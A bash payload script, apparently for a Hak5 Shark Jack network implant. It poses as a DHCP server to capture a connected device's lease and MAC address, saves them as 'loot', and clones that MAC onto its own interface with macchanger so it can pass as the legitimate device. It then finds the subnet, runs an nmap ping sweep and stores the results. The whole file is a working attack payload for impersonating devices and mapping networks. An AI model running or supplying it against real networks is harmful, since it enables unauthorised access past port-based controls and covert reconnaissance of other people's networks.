#!/bin/bash

# The code needs some clean up, non necessary "routes" that can be streamlined and a lot of
# LEDs used that is not really needed, just used for developing purposes.
# NOTE: As of September 2020, this payload script needs an alternative NETMODE file that uses
# dnsmasq instead of stock Attack Mode odhcpd.

LED SETUP

NETMODE DHCP_SERVER

sleep 5

DHCPFILE=/var/dhcp.leases

LED STAGE1
sleep 5

while ! [ -s $DHCPFILE ]; do  
  sleep 1
done 

LED SUCCESS
sleep 5

cp /var/dhcp.leases /root/loot/dhcp.leases

LED STAGE2
sleep 5

DHCPFILE="/root/loot/dhcp.leases"

MAC_ADDR=$(cat $DHCPFILE | cut -d ' ' -f2)

LED STAGE3

NETMODE DHCP_CLIENT

sleep 5 

ifconfig eth0 down
#ifconfig eth0 hw ether 12:00:15:b7:13:37
macchanger -m $MAC_ADDR eth0
ifconfig eth0 up

sleep 5

LED FINISH

# The code below is taken straight from the Nmap sample script on Hak5 GitHub
# https://github.com/hak5/sharkjack-payloads/blob/master/payloads/library/recon/Sample-Nmap-Payload/payload.sh

NMAP_OPTIONS="-sP --host-timeout 30s --max-retries 3"
LOOT_DIR=/root/loot/nmap

# Setup loot directory, DHCP client, and determine subnet
LED SETUP                            
mkdir -p $LOOT_DIR                           
COUNT=$(($(ls -l $LOOT_DIR/*.txt | wc -l)+1))
NETMODE DHCP_CLIENT                          
while [ -z "$SUBNET" ]; do  
  sleep 1 && SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
done                                                                                                                                                    
                                                                                                                                                        
# Scan network                                                                                                                                          
LED ATTACK    
nmap $NMAP_OPTIONS $SUBNET -oN $LOOT_DIR/nmap-scan_$COUNT.txt
LED FINISH                                                                          
sleep 2 && halt
